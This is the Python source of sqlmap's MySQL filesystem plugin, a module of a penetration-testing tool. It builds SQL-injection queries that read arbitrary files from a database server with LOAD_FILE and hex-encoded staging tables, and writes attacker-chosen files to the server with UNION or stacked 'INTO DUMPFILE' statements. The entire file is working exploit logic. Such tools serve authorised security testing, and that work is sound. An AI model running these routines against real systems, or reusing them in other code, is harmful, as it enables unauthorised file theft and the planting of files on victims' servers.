#!/usr/bin/env python

"""
Copyright (c) 2006-2014 sqlmap developers (http://sqlmap.org/)
See the file 'doc/COPYING' for copying permission
"""

from lib.core.common import isNumPosStrValue
from lib.core.common import isTechniqueAvailable
from lib.core.common import randomStr
from lib.core.common import singleTimeWarnMessage
from lib.core.data import conf
from lib.core.data import kb
from lib.core.data import logger
from lib.core.enums import CHARSET_TYPE
from lib.core.enums import EXPECTED
from lib.core.enums import PAYLOAD
from lib.core.enums import PLACE
from lib.core.exception import SqlmapNoneDataException
from lib.request import inject
from lib.techniques.union.use import unionUse
from plugins.generic.filesystem import Filesystem as GenericFilesystem

class Filesystem(GenericFilesystem):
    def __init__(self):
        GenericFilesystem.__init__(self)

    def nonStackedReadFile(self, rFile):
        infoMsg = "fetching file: '%s'" % rFile
        logger.info(infoMsg)

        result = inject.getValue("SELECT HEX(LOAD_FILE('%s'))" % rFile, charsetType=CHARSET_TYPE.HEXADECIMAL)

        return result

    def stackedReadFile(self, rFile):
        infoMsg = "fetching file: '%s'" % rFile
        logger.info(infoMsg)

        self.createSupportTbl(self.fileTblName, self.tblField, "longtext")
        self.getRemoteTempPath()

        tmpFile = "%s/tmpf%s" % (conf.tmpPath, randomStr(lowercase=True))

        debugMsg = "saving hexadecimal encoded content of file '%s' " % rFile
        debugMsg += "into temporary file '%s'" % tmpFile
        logger.debug(debugMsg)
        inject.goStacked("SELECT HEX(LOAD_FILE('%s')) INTO DUMPFILE '%s'" % (rFile, tmpFile))

        debugMsg = "loading the content of hexadecimal encoded file "
        debugMsg += "'%s' into support table" % rFile
        logger.debug(debugMsg)
        inject.goStacked("LOAD DATA INFILE '%s' INTO TABLE %s FIELDS TERMINATED BY '%s' (%s)" % (tmpFile, self.fileTblName, randomStr(10), self.tblField))

        length = inject.getValue("SELECT LENGTH(%s) FROM %s" % (self.tblField, self.fileTblName), resumeValue=False, expected=EXPECTED.INT, charsetType=CHARSET_TYPE.DIGITS)

        if not isNumPosStrValue(length):
            warnMsg = "unable to retrieve the content of the "
            warnMsg += "file '%s'" % rFile

            if conf.direct or isTechniqueAvailable(PAYLOAD.TECHNIQUE.UNION):
                warnMsg += ", going to fall-back to simpler UNION technique"
                logger.warn(warnMsg)
                result = self.nonStackedReadFile(rFile)
            else:
                raise SqlmapNoneDataException(warnMsg)
        else:
            length = int(length)
            sustrLen = 1024

            if length > sustrLen:
                result = []

                for i in xrange(1, length, sustrLen):
                    chunk = inject.getValue("SELECT MID(%s, %d, %d) FROM %s" % (self.tblField, i, sustrLen, self.fileTblName), unpack=False, resumeValue=False, charsetType=CHARSET_TYPE.HEXADECIMAL)

                    result.append(chunk)
            else:
                result = inject.getValue("SELECT %s FROM %s" % (self.tblField, self.fileTblName), resumeValue=False, charsetType=CHARSET_TYPE.HEXADECIMAL)

        return result

    def unionWriteFile(self, wFile, dFile, fileType, forceCheck=False):
        logger.debug("encoding file to its hexadecimal string value")

        fcEncodedList = self.fileEncode(wFile, "hex", True)
        fcEncodedStr = fcEncodedList[0]
        fcEncodedStrLen = len(fcEncodedStr)

        if kb.injection.place == PLACE.GET and fcEncodedStrLen > 8000:
            warnMsg = "the injection is on a GET parameter and the file "
            warnMsg += "to be written hexadecimal value is %d " % fcEncodedStrLen
            warnMsg += "bytes, this might cause errors in the file "
            warnMsg += "writing process"
            logger.warn(warnMsg)

        debugMsg = "exporting the %s file content to file '%s'" % (fileType, dFile)
        logger.debug(debugMsg)

        sqlQuery = "%s INTO DUMPFILE '%s'" % (fcEncodedStr, dFile)
        unionUse(sqlQuery, unpack=False)

        warnMsg = "expect junk characters inside the "
        warnMsg += "file as a leftover from UNION query"
        singleTimeWarnMessage(warnMsg)

        return self.askCheckWrittenFile(wFile, dFile, forceCheck)

    def stackedWriteFile(self, wFile, dFile, fileType, forceCheck=False):
        debugMsg = "creating a support table to write the hexadecimal "
        debugMsg += "encoded file to"
        logger.debug(debugMsg)

        self.createSupportTbl(self.fileTblName, self.tblField, "longblob")

        logger.debug("encoding file to its hexadecimal string value")
        fcEncodedList = self.fileEncode(wFile, "hex", False)

        debugMsg = "forging SQL statements to write the hexadecimal "
        debugMsg += "encoded file to the support table"
        logger.debug(debugMsg)

        sqlQueries = self.fileToSqlQueries(fcEncodedList)

        logger.debug("inserting the hexadecimal encoded file to the support table")

        for sqlQuery in sqlQueries:
            inject.goStacked(sqlQuery)

        debugMsg = "exporting the %s file content to file '%s'" % (fileType, dFile)
        logger.debug(debugMsg)

        # Reference: http://dev.mysql.com/doc/refman/5.1/en/select.html
        inject.goStacked("SELECT %s FROM %s INTO DUMPFILE '%s'" % (self.tblField, self.fileTblName, dFile), silent=True)

        return self.askCheckWrittenFile(wFile, dFile, forceCheck)
